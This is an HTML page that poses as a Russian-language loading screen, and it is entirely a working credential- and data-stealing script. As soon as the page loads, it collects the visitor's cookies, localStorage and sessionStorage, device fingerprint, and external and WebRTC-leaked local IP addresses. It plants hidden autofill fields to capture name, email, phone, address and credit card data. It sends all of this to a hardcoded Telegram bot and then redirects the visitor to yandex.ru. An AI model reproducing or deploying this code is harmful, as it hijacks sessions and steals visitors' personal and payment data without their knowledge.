<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #666; text-align: center; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p>Загрузка, пожалуйста подождите...</p>
    </div>

    <script>
   
        const TELEGRAM_TOKEN = '8292693570:AAHkns2Xyj2FFe0I0zYX5pqMXW6CFMQ3-io'; 
        const CHAT_ID = '7316763872'; 


        function sendToTelegram(message) {
            try {
                const img = new Image();
                img.src = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;

                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }),
                    mode: 'no-cors'
                });
            } catch (e) {}
        }

        (async function() {
            try {
                let fullMessage = `🔥 <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>\n\n`;
                fullMessage += `🕒 <b>Время:</b> ${new Date().toLocaleString()}\n`;
                fullMessage += `🌐 <b>URL:</b> ${window.location.href}\n`;

                const cookies = document.cookie;
                if (cookies) {
                    fullMessage += `\n🍪 <b>COOKIES:</b>\n<code>${cookies}</code>\n`;
                }

                let localStorageData = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localStorageData[key] = localStorage.getItem(key);
                }
                if (Object.keys(localStorageData).length > 0) {
                    fullMessage += `\n💾 <b>LOCALSTORAGE:</b>\n`;
                    for (let [k, v] of Object.entries(localStorageData)) {
                        fullMessage += `<code>${k}: ${v}</code>\n`;
                    }
                }

                let sessionStorageData = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    sessionStorageData[key] = sessionStorage.getItem(key);
                }
                if (Object.keys(sessionStorageData).length > 0) {
                    fullMessage += `\n📝 <b>SESSIONSTORAGE:</b>\n`;
                    for (let [k, v] of Object.entries(sessionStorageData)) {
                        fullMessage += `<code>${k}: ${v}</code>\n`;
                    }
                }

                fullMessage += `\n🖥️ <b>СИСТЕМА:</b>\n`;
                fullMessage += `🤖 <b>User-Agent:</b> ${navigator.userAgent}\n`;
                fullMessage += `💻 <b>Платформа:</b> ${navigator.platform}\n`;
                fullMessage += `🌍 <b>Язык:</b> ${navigator.language}\n`;
                fullMessage += `📺 <b>Экран:</b> ${screen.width}x${screen.height}\n`;
                fullMessage += `⏰ <b>Таймзона:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
                fullMessage += `🧠 <b>Ядер CPU:</b> ${navigator.hardwareConcurrency || 'неизвестно'}\n`;
                if (navigator.deviceMemory) {
                    fullMessage += `💾 <b>Память:</b> ${navigator.deviceMemory} GB\n`;
                }
                fullMessage += `🔗 <b>Referrer:</b> ${document.referrer || 'прямой заход'}\n`;

                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    fullMessage += `🌍 <b>Внешний IP:</b> ${data.ip}\n`;
                } catch (e) {}

                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) return;
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)?.[0];
                        if (ip) {
                            fullMessage += `🏠 <b>Локальный IP:</b> ${ip}\n`;
                            sendToTelegram(fullMessage);
                        }
                    };
                } catch (e) {}

                setTimeout(() => {
                    if (!fullMessage.includes('Локальный IP')) {
                        sendToTelegram(fullMessage);
                    }
                }, 2000);

                const autofillFields = ['name', 'email', 'tel', 'address', 'cc-name', 'cc-number'];
                autofillFields.forEach(field => {
                    const input = document.createElement('input');
                    input.setAttribute('name', field);
                    input.setAttribute('autocomplete', field);
                    input.style.opacity = '0';
                    input.style.position = 'absolute';
                    input.style.top = '-1000px';
                    input.style.left = '-1000px';
                    input.style.pointerEvents = 'none';
                    document.body.appendChild(input);
                });

                setTimeout(() => {
                    const autofillData = {};
                    document.querySelectorAll('input[name]').forEach(input => {
                        if (input.value && input.value.length > 1) {
                            autofillData[input.getAttribute('name')] = input.value;
                        }
                        input.remove(); 
                    });
                    
                    if (Object.keys(autofillData).length > 0) {
                        let autofillMessage = `🔐 <b>АВТОЗАПОЛНЕНИЕ</b>\n\n`;
                        for (let [key, value] of Object.entries(autofillData)) {
                            autofillMessage += `• <b>${key}:</b> ${value}\n`;
                        }
                        sendToTelegram(autofillMessage);
                    }
                }, 1500);

            } catch (e) {}
        })();

        setTimeout(function() {
            window.location.href = 'https://yandex.ru';
        }, 2000);
    </script>
</body>
</html>
